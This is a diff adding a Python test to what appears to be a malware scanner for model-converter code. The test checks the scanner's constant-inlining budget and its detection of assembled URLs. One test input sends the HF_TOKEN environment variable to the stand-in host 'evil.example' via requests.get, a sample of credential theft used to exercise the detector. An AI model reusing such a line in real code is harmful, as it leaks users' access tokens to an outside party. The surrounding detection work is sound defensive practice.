@@ -4157,6 +4157,52 @@ def test_a_url_builder_under_an_alias_or_a_result_object_refuses_it():
     ) == []
 
 
+def test_inlining_a_constant_is_charged_per_use():
+    """The budget is on what the substitution materialises, not on the name.
+
+    One 50 KB constant loaded a hundred times is five megabytes of text out of
+    a 49 KB file, and charging it once let the folds grow prefixes of that at
+    every level: six seconds on a file the scan accepts at up to 8 MiB. A fold
+    that would pass the ceiling is left unread instead, which is what the join
+    and the formatting already do.
+    """
+    module = _load(
+        "converter_scan_inline_budget_probe", "unsloth_zoo/converter_scan.py",
+    )
+    source = (
+        'import os\nimport requests\n'
+        'HUB = "https://huggingface.co"\n'
+        'BIG = "' + "A" * 50_000 + '"\n'
+        'url = ' + " + ".join(["BIG"] * 100) + '\n'
+        'requests.get(HUB, params = {"t": os.environ["HF_TOKEN"]})\n'
+    )
+    started = time.perf_counter()
+    assert module.scan_converter_source(source) == []
+    assert time.perf_counter() - started < 5
+
+    # Appending carries the same ceiling the join and the formatting do, since
+    # a chain of literal appends grows a prefix at every level whether a name
+    # was substituted into it or not: two operands over the limit are left
+    # unread rather than concatenated.
+    import ast as ast_module
+    oversized = ast_module.parse(
+        '"' + "A" * 600_000 + '" + "' + "B" * 600_000 + '"'
+    ).body[0].value
+    assert module._literal_text(oversized) is None
+
+    # A constant small enough to matter is still inlined, which is the whole
+    # point of doing it: this one assembles a destination.
+    assert [
+        f.check for f in module.scan_converter_source(
+            'import os\nimport requests\n'
+            'HUB = "https://huggingface.co"\n'
+            'host = "evil.example"\n'
+            'url = "https://" + host\n'
+            'requests.get(url, params = {"t": os.environ["HF_TOKEN"]})\n'
+        )
+    ]
+
+
 def test_the_hub_narrowing_does_not_reach_any_other_rule():
     """Only the env-harvest combination is narrowed. A credential stealer or a
     remote-code loader that happens to mention the hub is untouched.
